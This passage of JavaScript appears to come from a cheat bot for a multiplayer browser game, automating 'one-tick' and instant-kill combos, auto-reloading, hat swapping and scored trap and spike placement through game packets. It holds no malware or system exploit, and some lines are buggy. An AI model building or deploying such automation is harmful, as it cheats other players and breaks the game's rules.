    dF.min = dF.m1>= dF.m2? dF.m1 + dF.spikes: dF.m2 + dF.spikes;
    dF.soldier = _.placePot.onPlayer.length ? true : kb2 && _.pr===1 && !inTrap ? true : false
    return dF;
}




function move(e){
    if(moveDirection!=e){
        knla.send("9",e, "client")
    }
}
function seeInRange(e, t, min, type = undefined,vel){
    if(vel && dist(e.np.real,t.np.real,type) <= min){
        return true;
    }
    if(dist(e,t,type) <= min){
        return true
    }
    return false;
}





async function Shame(_,player = findPlayerSID(_.sid)){
    if(_.shameTimer <=0 || _.skinIndex!=45|| player == null||player == undefined) return;
    // player = Ii(_.sid);
    player.shameCount = 0
    player.clowned=true
    player.shameTimer -= (_.delta/1000);
    await nextTick();
    Shame(player);
}
function knockBack(player,target,angle, k){
    let priKnock = .3+(R.weapons[player?.primary]?.knock||0)
    let secKnock = .3+(R.weapons[player?.secondary]?.knock||0)
    !angle && (angle = getAimer(player,target))
    let cos = Math.cos(angle), sin = Math.sin(angle)
    k = {
        xP: priKnock * cos * 111,
        yP: priKnock * sin * 111,
        xS: secKnock * cos * 111,
        yS: secKnock * sin * 111,
    }
    let ez = {
        priKB: {x: target.x2 + (target.xVel + k.xP), y: target.y2 + (target.yVel + k.yP)},
        secKB: {x: target.x2 + (target.xVel + k.xS), y: target.y2 + (target.yVel + k.yS)},
        turKB: {x: target.x2 + (target.xVel + .3 * cos * 111), y: target.y2 + (target.yVel + .3 * sin * 111)},
        priTKB: {x: target.x2 + (target.xVel + k.xP + .3), y: target.y2 + (target.yVel + k.xP + .3)},
        secTKB: {x: target.x2 + (target.xVel + k.xS + .3), y: target.y2 + (target.yVel + k.xS + .3)},
        fpriKB: {x: target.np.real.x + (target.np.xVel + k.xP), y: target.np.real.y + (target.np.yVel + k.yP)},
        fsecKB: {x: target.np.real.x + (target.np.xVel + k.xS), y: target.np.real.y + (target.np.yVel + k.yS)},
        fturKB: {x: target.np.real.x + (target.np.xVel + .3 * cos * 111),y: target.np.real.y + (target.np.yVel + .3 * sin * 111)},
        fpriTKB: {x: target.np.real.x + (target.np.xVel + k.xP + .3), y: target.np.real.y + (target.np.yVel + k.xP + .3)},
        fsecTKB: {x: target.np.real.x + (target.np.xVel + k.xS + .3), y: target.np.real.y + (target.np.yVel + k.xS + .3)}
    }
    return ez
}
function fastHats(test){
    //  let Qs = E.y2*1.5-E.y/2;
    if(E.y2 <= T.snowBiomeTop){
        if(test) return {skinIndex:15,tailIndex:11}
        Hg(15, 11);
    }else if(E.inWater){
        if(test) return {skinIndex:31,tailIndex:11}
        Hg(31, 11);
    }else{
        if(test) return {skinIndex:12,tailIndex:11}
        Hg(12, 11);
    }
}
function absolute(){
    if(!amAlive) return;
}

if(window.location.href.startsWith('https://sandbox')) sandbox = true;
list = R.list

let lpo = [0,0];
function reload(e = R.weapons){
    if(inTrap||wr_obj||meleesyncing||aim[0]!==null||E.pr===1&&E.sr===1&&lpo[0]||hold||!amAlive||keys.lc||keys.rc || keys.mc || oneTick || boostOT) return;
    if(E.sr!=1){
        if(E.weaponIndex!=secondary||E.buildIndex!=-1)knla.send("z",secondary,true)
        hold = secondary;
        lpo[1]=true;
    }
    if(E.pr!=1&& (E.sr==1||secondary===null)){
        if(E.weaponIndex!=primary||E.buildIndex!=-1)knla.send("z",primary,true);
        hold = primary;
        lpo[1]=true;
    }
}



//snow 377-344
//max 384 min: 344
function BOT(tTime, bTime, pTime, fp,fp2) {
    if(!oneTickToggle) {
        boostOT = false
        oneTick = false;
        return
    }

    if(!nearestenemy || wr_obj || !oneTickToggle|| inTrap||!secondary||!amAlive) {
        oneTick = false;
        return;
    }

    //CPH6(R, nearestenemy, 3, 2.0, getAimer(R, nearestenemy)) reference
    if(dist(E,nearestenemy)<=700 && E.pr === 1 && E.sr === 1 && E.tr === 1) {
        boostOT = true;
        oneTick = true;
        const projectionDistance = 395;
        const angle = getAimer(nearestenemy, E);
        let coords = {x:nearestenemy.x2 + cos(angle) * projectionDistance, y: nearestenemy.y2 + sin(angle) * projectionDistance}
        let roundD = dist(E,nearestenemy)
        let coordDist = dist(E,coords)
        if(coordDist<=25) {
            Hg(40,0)
        } else if(coordDist<=60){
            Hg(22,0)
        } else if(coordDist<=110){
            Hg(22,11)
        } else{
            fastHats()
        }


        if(CPH6(E, nearestenemy, 3, 2.0, getAimer(E, nearestenemy)) >= 1 && E.movSpd <=0 && nearestenemy.movSpd <=0 && CPH6(E, nearestenemy, 1, 1.5, getAimer(E, nearestenemy))!==CPH6(E, nearestenemy, 3, 2.0, getAimer(E, nearestenemy)) && dist(E,nearestenemy) <= 412 && dist(E,nearestenemy) >= 378) {
            let dir = getAimer(E,nearestenemy)
            hold = secondary
            knla.send("z",secondary,true)
            place(boostType,dir+toRad(40))
            place(boostType,dir-toRad(40))
            boostOT = true;
            Hg(53,0);
            bTime = (CPH6(E, nearestenemy, 1, 1.5, getAimer(E, nearestenemy)) - CPH6(E, nearestenemy, 3, 2.0, getAimer(E, nearestenemy))) * 111;
            pTime = CPH6(E, nearestenemy, 1, 1.5, getAimer(E, nearestenemy)) * 111;
            fp = bTime + 80
            fp2 = bTime + E.delta
            knla.send("D",dir, "client")
            visAim = true
            /*move shoot shit wait shit needs to be here
               */
            setTimeout(() => {
                fastHats()
                oneTick = false
                wr_obj = true;
                aim[0] = dir
                hold = secondary
                knla.send("D",dir, "client")
                knla.send("z",secondary,true)
                knla.send("F", 1, dir);
                knla.send("F", 0, dir)
                knla.send("9", dir, "client")

            },bTime)
            /* wait shit
           await nextTick();
           */
            setTimeout(() => {
                hold = primary
                Hg(7,13)
                visAim = true;
                aim[0] = dir
                knla.send("D",dir)
                knla.send("z",primary,true)
        
                knla.send("F", 1, dir);
                knla.send("F", 0, dir)
            },fp)
            setTimeout(() => {
                hold = primary
                Hg(7,13)
                visAim = true;
                aim[0] = dir
                knla.send("D",dir, "client")
                knla.send("z",primary,true)
              
                knla.send("F", 1, dir);
                knla.send("F", 0, dir)
            },fp2)
            setTimeout(() => {
                knla.send("9", dir, "client")
                hold = primary
                Hg(7,13)
                visAim = true;
                aim[0] = dir
                knla.send("D",dir, "client")
                knla.send("z",primary,true)
              
                knla.send("F", 1, dir);
                knla.send("F", 0, dir)
            },pTime)
            /*turn off wait shit
await nextTick()
*/
            setTimeout(() => {
                oneTickToggle = false
                wr_obj = false;
                oneTick = false;
                boostOT = false;
                visAim = false;
            },450)
        } else if(!(dist(E,nearestenemy)>=378&&dist(E,nearestenemy)<=412)){
            knla.send("9",getAimer(E,coords), "client");
        } else{
            knla.send("9",null, "client")
        }
    }
}
async function boostOneTick() {
    if(!nearestenemy || wr_obj || !oneTickToggle || E.tr !== 1 || E.pr !== 1 || E.sr !== 1 || inTrap||!secondary||secondary===10||secondary===14||!amAlive) {
        oneTick = false;
        return;
    }
    if(nearestenemy.bleed === undefined){
    
        oneTickToggle = false
        return
    }
    //move logic
    if(dist(E,nearestenemy)<=600) {
        boostOT = true;
        oneTick = true;
        const projectionDistance = bMin;
        const angle = getAimer(nearestenemy, E);
        let coords = {x:nearestenemy.x2 + cos(angle) * projectionDistance, y: nearestenemy.y2 + sin(angle) * projectionDistance}
        let roundD = dist(E,nearestenemy)
        let coordDist = dist(E,coords)
        if(coordDist<=15) {
            if(E.buildIndex!=1)knla.send("z",foodType);
            Hg(40,0)
            hold = foodType
        } else if(coordDist<=50){
            Hg(22,0)
            hold = secondary;
            knla.send("z",secondary,true);
        } else if(coordDist<=120){
            Hg(6,0)
            hold = primary;
            knla.send("z",primary,true);
        } else{
            bh()
            hold = primary;
            knla.send("z",primary,true)
        }




        if(roundD>=bMin && roundD<=bMax && E.movSpd <=5 && nearestenemy.movSpd <=5&&nearestenemy.bleed === 8) {
            let dir = getAimer(E,nearestenemy)
            Hg(53,11);
            knla.send("D",dir, "client")
            visAim = true
            oneTick = false
            boostOT = true;
            wr_obj = true;
            aim[0] = dir
            hold = secondary
            knla.send("z",secondary,true)
        
            if(R.list[utilityType].name == "platform"){
                place(utilityType,dir+toRad(90))
                place(utilityType,dir+toRad(180))
                place(utilityType,dir-toRad(90))
            }
            knla.send("9", dir, "client")
            place(boostType,dir)
            await nextTick();
            dir = getAimer(E,nearestenemy)
            knla.send("9", dir, "client")
            hold = primary
            Hg(7,13)
            visAim = true;
            aim[0] = dir
            knla.send("D",dir, "client")
            knla.send("z",primary,true)
            await nextTick()
            oneTickToggle = false
            wr_obj = false;
            oneTick = false;
            boostOT = false;
            visAim = false;
        } else if(!(roundD>=bMin&&roundD<=bMax)){
            knla.send("9",getAimer(E,coords), "client");
        } else{
            knla.send("9",null, "client")
        }
    }
}

async function bowOneTick() {
    if(!nearestenemy || primary !=5 || wr_obj || !oneTickToggle || E.tr !=1 || E.pr!=1 || !nearestenemy?.inTrap || inTrap || nearestenemy.skinIndex == 22) {
        oneTick = false;
        return
    }


    if(nearestenemy && dist(E,nearestenemy)<=330 && oneTickToggle && E.tr == 1 && E.pr == 1 && nearestenemy?.inTrap && !inTrap && !wr_obj && nearestenemy.skinIndex !== 22) {
        oneTick = true;
        const projectionDistance = 212;

        const angle = getAimer(nearestenemy,E)
        let coords = {x:nearestenemy.x2 + Math.cos(angle) * projectionDistance, y: nearestenemy.y2 + Math.sin(angle) * projectionDistance}
        let distance = dist(E,nearestenemy);
        if(dist(E,coords)<=30){
            Hg(6,0)
        }


        if(!(distance>=210&&distance<=240)&& !wr_obj){
            knla.send("9",getAimer(E,coords));
        } else{
            knla.send("9",null)
        }
    }

    if(nearestenemy.skinIndex != 22 &&!wr_obj&&dist(E,nearestenemy)>=210&& E.tr === 1 && E.pr == 1 &&nearestenemy&&nreload(nearestenemy) == 1&& nearestenemy.weaponR!=1 && nearestenemy?.inTrap && dist(E,nearestenemy)<=250&&gE('onetick bypass')?.checked && !inTrap) {
        wr_obj = true;
        oneTick = false
        knla.send("9", getAimer(E,nearestenemy))
        knla.send("D",getAimer(nearestenemy,E))
        visAim = true
        aim[0] = getAimer(nearestenemy,E)
        hold = secondary
        knla.send("z",secondary,true)
        Hg(53,11)
        await delay(111);
        hold = primary
        knla.send("z",primary,true)
        aim[0] = getAimer(E,nearestenemy)
        knla.send("D",getAimer(E,nearestenemy))
        knla.send("9", getAimer(E,nearestenemy))
        Hg(7,18);
        await delay(111);
        wr_obj = false;
        hold = null
        knla.send("9", null)
    }
}
async function shootSync3(e, g) {
    if (E.sr !== 1 || !nearestenemy || !syncTeam || syncTeam.sr !== 1 || maxTime3() > 0 || nearestenemy.skinIndex == 6) return;
    if(E.sr === 1 && syncTeam.sr === 1 && !wr_obj && nearestenemy && nearestenemy.skinIndex !== 6) {
        Hg(1,0);
        wr_obj = true;
        aim[0] = getAimer(E, nearestenemy);
        visAim = true;
        knla.send("D", getAimer(E, nearestenemy), "client");
        knla.send("z", secondary, true);
        hold = secondary;
        await nextTick();
        await nextTick();
        wr_obj = false;
    }
}

async function doInsta(e){
    if(!e||oneTickToggle&&primary==5)return;
    if(!nearestenemy) return;
    if(E.secondary != 13 && ((primary==4||primary==5)&&secondary==10)&&nearestenemy.skinIndex!=6&& nearestenemy&&!wr_obj&&(dist(E.np.accel,nearestenemy.np.real,"player")<=R.weapons[secondary].range||dist(E,nearestenemy,"player")<=R.weapons[secondary].range)&&E.pr==1&&E.sr==1&&amAlive&&shieldBypass(E,nearestenemy)){
        WR = false;
        // console.log("reverse insta");
        wr_obj = true;
        Hg(53,21)
        aim[0] = getAimer(E,nearestenemy)
        visAim = true;
        knla.send("D",getAimer(E,nearestenemy), "client");
        knla.send("z",secondary,true)
        hold = secondary
        //  console.log(nearestenemy.np.real.type);
        await nextTick();
        if(nearestenemy){
            hold = primary
            knla.send("z",primary,true)
            aim[0] = getAimer(E,nearestenemy);
            knla.send("D",getAimer(E,nearestenemy), "client");
            Hg(7,18);
        } else {
            wr_obj =false
            return
        }
        await nextTick();
        wr_obj = false;
    }
    if(E.secondary != 13 &&!((primary==4||primary==5)&&secondary==10)&& nearestenemy&&!wr_obj&&(dist(E.np.accel,nearestenemy.np.real,"player")<=R.weapons[primary].range||dist(E,nearestenemy,"player")<=R.weapons[primary].range)&&E.pr==1&&E.sr==1&&amAlive&&shieldBypass(E,nearestenemy)){
        WR = false;
        console.log(dist(E.np.accel,nearestenemy.np.real,"player"))
        // console.log("regular insta");
        wr_obj = true;
        Hg(7,18)
        aim[0] = getAimer(E,nearestenemy)
        visAim = true;
        knla.send("D",getAimer(E,nearestenemy), "client");
        knla.send("z",primary,true)
        hold = primary
        //  console.log(nearestenemy.np.real.type);
        await nextTick();
        if(nearestenemy){
            hold = secondary
            knla.send("z",secondary,true)
            aim[0] = getAimer(E,nearestenemy);
            knla.send("D",getAimer(E,nearestenemy), "client");
            Hg(53,21);
        } else {
            wr_obj =false
            return
        }
        await nextTick();
        wr_obj = false;
    }
    if(E.secondary == 13 && nearestenemy&&!wr_obj&&(dist(E.np.accel,nearestenemy.np.real,"player")<=R.weapons[primary].range||dist(E,nearestenemy,"player")<=R.weapons[primary].range)&&E.pr==1&&E.sr==1&&amAlive&&shieldBypass(E,nearestenemy)){
        WR = false;
        ///  console.log("reverse insta");
        wr_obj = true;
        //  console.log(nearestenemy.np.real.type);
        hold = secondary
        knla.send("z",secondary,true)
        aim[0] = getAimer(E,nearestenemy);
        knla.send("D",getAimer(E,nearestenemy), "client");
        Hg(53,21);
        await nextTick();
        if(nearestenemy){
            Hg(7,18)
            aim[0] = getAimer(E,nearestenemy)
            visAim = true;
            knla.send("D",getAimer(E,nearestenemy), "client");
            knla.send("z",primary,true)
            hold = primary
        } else {
            wr_obj =false
            return
        }
        await nextTick();
        wr_obj = false;
    }
}
let healTick = false
R.a = R.list.concat(R.weapons);


We.style.display = "none";


var anglesGenerated = [];
var updatedPos = {x:null,y:null}
function enemyPlacement(enemy, item, gAng, xd = PI / 50) {
    const interval = xd;
    const potentialAngles = { onPlayer: [], possible: [], placeRange: null };
    const i = R.list[item];
    const baseScale = 35 + i.scale + (i.placeOffset || 0);

    for (let offset = gAng; offset <= gAng + PI2; offset += interval) {
        const angle = offset;
        const tmpS = baseScale;
        const cosAngle = cos(angle);
        const sinAngle = sin(angle);
        const tmpX = enemy.x2 + tmpS * cosAngle;
        const tmpY = enemy.y2 + tmpS * sinAngle;
        const obj = { x: tmpX, y: tmpY, scale: i.scale, angle: angle, placeRange: tmpS, overlap: [], preplacer: [], sids: [] };
        const canPlace = ue.checkItemLocation3(tmpX, tmpY, i.scale, 0.6, i.id, false, true, obj);
        if (dist({ x: tmpX, y: tmpY }, E) <= i.scale + 35) {
            if (canPlace) {
                potentialAngles.onPlayer.unshift(obj);
            }
        }
        if (canPlace) {
            potentialAngles.possible.unshift(obj);
        }
    }
    return potentialAngles;
}
/*function enemyPlacement(enemy,item, gAng, xd = Math.PI / 50) { // originally 30
    const givenAngle = gAng;
    const interval = xd;
    const potentialAngles = {onPlayer:[],possible:[],placeRange:null}// {onPlayer:[],norm:[]};
    //  let ang = getAimer(enemy,E)
    for (let offset = gAng; offset <= gAng + (Math.PI * 2); offset += interval) {

        const angle = offset;
        let i = R.list[item];
        let tmpS = (35 + i.scale + (i.placeOffset || 0));
        let tmpX = enemy.x2 + (tmpS * Math.cos(angle));
        let tmpY = enemy.y2 + (tmpS * Math.sin(angle));
        let obj = {x:tmpX,y:tmpY, scale: i.scale, angle:angle, placeRange:tmpS,overlap:[],preplacer:[],sids:[]}
        potentialAngles.placeRange = tmpS
        let canPlace = ue.checkItemLocation3(tmpX, tmpY, i.scale, 0.6, i.id, false, true, obj)
        if(dist({x:tmpX,y:tmpY},E) <= i.scale + 35){
            if (canPlace)
                potentialAngles.onPlayer.unshift(obj)
            }
        }
        if(canPlace){
            potentialAngles.possible.unshift(obj)
        }
    }
    if(potentialAngles) return potentialAngles;
    return false;
}*/




// placements happen after kb position is solidified basically ur coordinates after getting knocked back from melee hit and the projection of that with ur placement
function findAvailableAngles(item, thisAng, vel, xd = PI / 75){ // originally 60
    if(!item) return [];
    //   const givenAngle = gAng;
    const interval = xd;
    const potentialAngles = []// {onPlayer:[],norm:[]};
    let x = vel ? E.np.real.x : E.x2
    let y = vel ? E.np.real.y : E.y2
    for (let offset = thisAng; offset <= thisAng + PI2; offset += interval) {
        const angle = offset;
        let used = usedAngles.findIndex(x => dAng(angle, x.angle) <= 0.45);
        let i = R.list[item];
        let tmpS = (35 + i.scale + (i.placeOffset || 0));
        let tmpX = x + (tmpS * cos(angle));
        let tmpY = y + (tmpS * sin(angle));
        let obj = {x: tmpX, y: tmpY, id: i.id, scale: i.scale, angle: angle, offset: tmpS, item: i, collide: [], points: 0, origin: [], name: i.name, overlap: [], preplacer:[],sids:[],intercepts:[],knockback:[], used: used}
        let canPlace = packets <= 90 ? ue.checkItemLocation3(tmpX, tmpY, i.scale, 0.6, i.id, false, true, obj) : ue.checkItemLocation(tmpX, tmpY, i.scale, 0.6, i.id, false, true)
        if(used !== -1){
            if(!canPlace) usedAngles.splice(used, 1);
            //   continue;
        }

        if(canPlace)potentialAngles.push(obj);
    }
    //showAngles = potentialAngles;
    return potentialAngles;
}
function findAvailableAnglesR(item, thisAng, vel, xd = PI / 75){ // originally 60
    if(!item) return [];
    //   const givenAngle = gAng;
    const interval = xd;
    const potentialAngles = []// {onPlayer:[],norm:[]};
    let x = vel ? E.np.real.x : E.x2
    let y = vel ? E.np.real.y : E.y2
    for (let offset = thisAng; offset <= thisAng + PI2; offset += interval) {
        const angle = offset;
        let used = usedAngles.findIndex(x => dAng(angle, x.angle) <= 0.45);
        let i = R.list[item];
        let tmpS = (35 + i.scale + (i.placeOffset || 0));
        let tmpX = x + (tmpS * cos(angle));
        let tmpY = y + (tmpS * sin(angle));
        let obj = {x: tmpX, y: tmpY, id: i.id, scale: i.scale, angle: angle, offset: tmpS, item: i, collide: [], points: 0, origin: [], name: i.name, overlap: [], preplacer:[],sids:[],intercepts:[],knockback:[], used: used}
        let canPlace = ue.checkItemLocation3(tmpX, tmpY, i.scale, 0.6, i.id, false, true, obj);
        if(canPlace) potentialAngles.push(obj);
    }
    //showAngles = potentialAngles;
    return potentialAngles;
}
function findAvailableAnglesOld(item, thisAng, vel, xd = PI / 75){ // originally 60
    if(item == undefined || item == null || !item) return [];
    //   const givenAngle = gAng;
    const interval = xd;
    const potentialAngles = []// {onPlayer:[],norm:[]};
    let x = vel ? E.np.real.x : E.x2
    let y = vel ? E.np.real.y : E.y2
    for (let offset = thisAng; offset <= thisAng + PI2; offset += interval) {
        const angle = offset;
        let used = usedAngles.findIndex(x => dAng(angle, x.angle) <= 0.45);
        let i = R.list[item];
        let tmpS = (35 + i.scale + (i.placeOffset || 0));
        let tmpX = x + (tmpS * cos(angle));
        let tmpY = y + (tmpS * sin(angle));
        let obj = {x: tmpX, y: tmpY, id: i.id, scale: i.scale, angle: angle, offset: tmpS, item: i, collide: [], points: 0, origin: [], name: i.name, overlap: [], preplacer:[],sids:[],intercepts:[],knockback:[], used: used}
        let canPlace = packets <= 90 ? ue.checkItemLocation3(tmpX, tmpY, i.scale, 0.6, i.id, false, true, obj) : ue.checkItemLocation(tmpX, tmpY, i.scale, 0.6, i.id, false, true)
        if(used !== -1){
            if(!canPlace) usedAngles.splice(used, 1);
            //   continue;
        }

        if(canPlace)potentialAngles.push(obj);
    }
    //showAngles = potentialAngles;
    return potentialAngles;
}
var showAngles = []
function knockIntoP(spike,objs,enemy){
    let obj = {building: null, closest: Infinity, bounce: false, dmg: 0, spikeCount: 0, trapCount: 0, total: 0, newPos: {...enemy}}
    objs = objs.filter(x => !clan(x.owner?.sid) || x.y >= 12000 && x.type === 1)
    for(let m = 0; m < spike.length; m++) {
        let dir = Math.atan2(enemy.y2 - spike[m].y, enemy.x2 - spike[m].x); //getAimer(spike,enemy)
        for(let i = 0; i < objs.length; i++){
            //console.log(spike, objs[i]);
            let distance = fastHypot(enemy.np.real.x-objs[i].x, enemy.np.real.y - objs[i].y)//dist2(enemy,objs[i])
            let closestPoint = calcPoint(enemy.np.real.x, enemy.np.real.y, dir, min(distance, 170));
            obj.newPos.affected = enemy.sid;
            obj.newPos.NEWX = closestPoint.x;
            obj.newPos.NEWY = closestPoint.y;
            obj.originDir = dir;
            obj.newPos.dstSpd = distance;
            obj.newPos.static = true;
            obj.newPos.expire = 3;
            if(fastHypot(closestPoint.x-objs[i].x, closestPoint.y-objs[i].y) <= (objs[i].name == "pit trap" ? 45.5 : objs[i].realScale + 35) && distance < obj.closest){
                obj.closest = distance
                obj.building = objs[i]
                if(distance <= 150 && distance >= 50 && (objs[i].group?.name == "spikes" || objs[i].type === 1) && dAng(dir, atan2(objs[i].y - spike.y, objs[i].x - spike.x)) <= .17){
                    obj.bounce = true;
                } else {
                    obj.bounce = false;
                }
                return obj;
            }
        }
    }
    return obj;
    // dAng() <= .19 + 45 distance too
}
function knockInto(spike,objs,enemy){
    let obj = {building: null, closest: Infinity, bounce: false, dmg: 0, spikeCount: 0, trapCount: 0, total: 0, newPos: {...enemy}}
    let dir = getAimer(spike,enemy)
    objs = objs.filter(x => (clan(x.owner?.sid) || !enemy.team && x?.owner?.sid != enemy.sid)|| x.y >= 12000 && x.type === 1)
    for(let i = 0; i < objs.length; i++){

        let distance = fastHypot(enemy.np.real.x-objs[i].x, enemy.np.real.y - objs[i].y)//dist2(enemy,objs[i])
        let closestPoint = calcPoint(enemy.np.real.x, enemy.np.real.y, dir, min(distance, 170));
        obj.newPos.affected = enemy.sid;
        obj.newPos.NEWX = closestPoint.x;
        obj.newPos.NEWY = closestPoint.y;
        obj.originDir = dir;
        obj.newPos.dstSpd = distance;
        obj.newPos.static = true;
        obj.newPos.expire = 3;
        //  fastHypot(player.x2-a.x,player.y2-a.y)
        if(fastHypot(closestPoint.x-objs[i].x, closestPoint.y-objs[i].y) <= (objs[i].name == "pit trap" ? 47.5 : objs[i].realScale + 35) && distance < obj.closest){
            obj.closest = distance
            obj.building = objs[i]
            if(distance <= 150 && distance >= 50 && (objs[i].group?.name == "spikes" || objs[i].type === 1) && dAng(dir,getAimer(spike,objs[i])) <= .17){
                obj.bounce = true;
            } else {
                obj.bounce = false
            }
        }
    }
    return obj;
    // dAng() <= .19 + 45 distance too
}
// this is using lines as borders with spikes meant for infinite knockback simulations
function findIntersectionPoints(line, circle) {
    let intersections = [];
    let dx = line[1].x - line[0].x;
    let dy = line[1].y - line[0].y;
    let dr = sqrt(dx * dx + dy * dy);
    let D = line[0].x * line[1].y - line[1].x * line[0].y;
    let discriminant = circle.scale * circle.scale * dr * dr - D * D;

    if (discriminant >= 0) {
        let sign = dy < 0 ? -1 : 1;
        let x1 = (D * dy + sign * dx * sqrt(discriminant)) / (dr * dr);
        let x2 = (D * dy - sign * dx * sqrt(discriminant)) / (dr * dr);
        let y1 = (-D * dx + abs(dy) * sqrt(discriminant)) / (dr * dr);
        let y2 = (-D * dx - abs(dy) * sqrt(discriminant)) / (dr * dr);

        intersections.push({ x: x1, y: y1 }, { x: x2, y: y2 });
    }

    return intersections;
}
// this shows me what part of line intercepts the circle
function findIntersectionParts(line, circle) {
    let intersections = findIntersectionPoints(line, circle);
    let intersectionParts = [];

    intersections.forEach((intersection) => {
        let t = (intersection.x - line[0].x) / (line[1].x - line[0].x);
        if (t >= 0 && t <= 1) {
            intersectionParts.push({ x: intersection.x, y: intersection.y });
        }
    });

    return intersectionParts;
}
function createBorderLines(buildings) {
    let lines = [];
    // makes lines for circle borders
    buildings.forEach((building) => {
        let { x, y, scale } = building;
        let circumference = PI2 * scale;
        let numSegments = Math.floor(circumference / (2 * scale)); //  this the number of line segments
        for (let i = 0; i < numSegments; i++) {
            let angle1 = (i / numSegments) * PI2;
            let angle2 = ((i + 1) / numSegments) * PI2;
            let x1 = x + scale * cos(angle1);
            let y1 = y + scale * sin(angle1);
            let x2 = x + scale * cos(angle2);
            let y2 = y + scale * sin(angle2);
            lines.push([{ x: x1, y: y1 }, { x: x2, y: y2 }]);
        }
    });

    return lines;
}
//check if the point is surrounded by buildings
function isPointSurroundedByBuildings(point, buildings) {
    let borderLines = createBorderLines(buildings);
    return borderLines.every((line) => {
        let intersectionParts = findIntersectionParts(line, point);
        return intersectionParts.length === 0;
    });
}
/*
manually grading points to every angle for all enemies
can get more specific but beware of performance costs
avoid multi calculation of the same thing
performance costs = u get outplaced
*/
let placeDist = 350, sOffset = 50, trapDst = 50;//47;
// originally 235 placeDist
function fHypot(x, y) {
    return sqrt(x * x + y * y);
}
/*
manually grading points to every angle for all enemies
can get more specific but beware of performance costs
avoid multi calculation of the same thing
performance costs = u get outplaced
*/
function gradeAngles(spike, trap, newEnemies, time) {
    let kln, rNn;
    let sbp = nearObjects.filter(x => (x.name == "pit trap" || x.group?.name == "spikes" || x.type === 1 && x.y >= 12000) && x.distance <= 450);
    letlapw = {};
    let sSet = R.list[spikeType].scale - 50;
    for(let i = 0; i < newEnemies.length; i++) { //for(let i = newEnemies.length, enemy; i--, (enemy = newEnemies[i]);) {
        let enemy = newEnemies[i];
        for(let t = 0; t < trap.length; t++) { //for(let t = trap.length; t--;) {
            let angleAbuse = true;
            for(let len = 0; len < enemy.placePot.possible.length; len++){
                let obj = enemy.placePot.possible[len];
               lapw[trap[t].angle + enemy.name + enemy.sid + obj.angle] = dist2(trap[t], obj);
                if(lapw[trap[t].angle + enemy.name + enemy.sid + obj.angle] <= trap[t].scale + obj.scale) {
                    trap[t].placePriority = true;
                    angleAbuse = false;
                    break;
                }
            }
            if(trap[t].preplacer.includes(true) && trap[t].placePriority){
                trap[t].preplace = true;
                trap[t].points += 1;
            }
            if(!trap[t].preplace && trap[t].used !== -1){
                trap.splice(t, 1);
                continue;
            };
            let dist4 = dist2(trap[t], enemy);
            if(dist4 <= 235 && !enemy.inTrap || keys.c) trap[t].points += 1;
            if(dist4 <= 20.4) { // stops from placing
                trap[i].points += 1;
            }
            if(dist4 <= 47){ // maybe use 50
                trap[t].retrap = true;
                trap[t].collide.push(enemy.sid);
                trap[t].points += 1;
                if(trap[t].preplace && enemy.inTrap) {
                    let obj1 = sbp.filter(spk => (spk?.group?.name === "spikes" && (clan(spk.owner.sid) || !enemy.team && spk?.owner?.sid != enemy.sid)|| spk.y >= 12000 && spk.type === 1) && fastHypot(spk.x-trap[t].x,spk.y-trap[t].y) <= 50 + (spk.type == 1 ? spk.scale * 0.55 : spk.scale) + 24 && !trap[t].sids.includes(spk.sid));
                    // maybe uncomment this again, lets find out later
                    //trap[t].points += 1; // 1.5
                    if(obj1.length) {
                        trap[t].points += (obj1.length + 1);
                    } else {
                        let enemyToTrap = atan2(enemy.inTrap.y - enemy.y2, enemy.inTrap.x - enemy.x2);
                        let enemyCanHitTrapWhileHittingPlayer = C.getAngleDist(getAimer(enemy, enemyToTrap), enemy.d2) <= gatherAng && C.getAngleDist(getAimer(E, enemy), getAimer(enemy, enemyToTrap)) <= gatherAng;
                        if(!enemyCanHitTrapWhileHittingPlayer) {
                            trap[t].points += 2;
                        } else {
                            trap[t].points += 1;
                        }
                    }
                }
            }
            let obj = sbp.filter(spk => (spk?.group?.name === "spikes" && (clan(spk.owner.sid) || !enemy.team && spk?.owner?.sid != enemy.sid) || spk.y >= 12000 && spk.type === 1) && fastHypot(spk.x-trap[t].x,spk.y-trap[t].y) <= 50 + (spk.type == 1 ? spk.scale * 0.55 : spk.scale) + 24 && !trap[t].sids.includes(spk.sid))
            if(obj.length) { // trap auto push potential
                trap[t].points += (1 + obj.length);
                trap[t].canPush = true;
            }
            /* if(!angleAbuse){ // too performance inefficient to use may revisit later
                let points = trap[i].intercepts.length * .25
                trap[i].points += points
                trap[i].origin.push({amount:points,from:'blocks angle',player:x})
            }*/
            if(dist4 <= enemy.placePot.placeRange) {
                if(angleAbuse) { // angle abuse
                    trap[t].points += 1;
                } else { // blocks angle
                    trap[t].points += .5;
                }
            }
            if(!rNn || rNn.points <= trap[t].points) rNn = trap[t];
        }
        for(let s = 0; s < spike.length; s++) { //for(let s = spike.length; s--;){
            spike[s].bounce = false;
            if(isInPath(spike[s])) continue;
            let dist4 = dist2(spike[s], enemy);
            let angleAbuse = true;
            for(let len = 0; len < enemy.placePot.possible.length; len++){
                let obj = enemy.placePot.possible[len];
                if(lapw[spike[s].angle + enemy.name + enemy.sid + obj.angle] + sSet <= spike[s].scale + obj.scale){
                    spike[s].placePriority = true;
                    angleAbuse = false;
                    break;
                }
            }
            if(spike[s].preplacer.includes(true) && spike[s].placePriority) {
                spike[s].preplace = true;
                spike[s].points += 1;
            }
            if(!spike[s].preplace && spike[s].used !== -1){
                spike.splice(s, 1);
                continue;
            };
            let trapDist = enemy.inTrap ? dist2(spike[s], enemy.inTrap) : Infinity;
            if(dist4 <= 35 + spike[s].scale) {
                //if(spike[i].collide.length >=1) spike[i].origin.push({amount:1,from:`collides with ${x.name}[${x.sid}]`,player:x})
                spike[s].collide.push(enemy.sid)
                if(!enemy.inTrap || spike[s].preplace) {
                    let bouncer = knockInto(spike[s], sbp, enemy);
                    if(bouncer.building) {
                        spike[s].into = bouncer;
                        if(bouncer.building.name == "pit trap" && !(spike[s].preplace && enemy.inTrap && spike[s].sids.includes(enemy.inTrap.sid))){
                            spike[s].points += 2.5;
                            //spike[i].origin.push({amount:1.5,from:'spike knocks into trap',player:x})
                        } else if(bouncer.bounce){
                            spike[s].bounce = true;
                            spike[s].points += 5;
                            //spike[i].origin.push({amount:2,from:'knocks between spike infinitely test',player:x})
                        } else if(bouncer.building.name !== "pit trap"){
                            spike[s].points += 3;
                            //spike[i].origin.push({amount:2,from:'knocks into spike',player:x})
                        } else {
                            spike[s].into = false
                        }
                    }
                }
                if(enemy.inTrap && !spike[s].sids.includes(enemy.inTrap.sid)) { // spike collides with player while in trap
                    spike[s].points += 2;
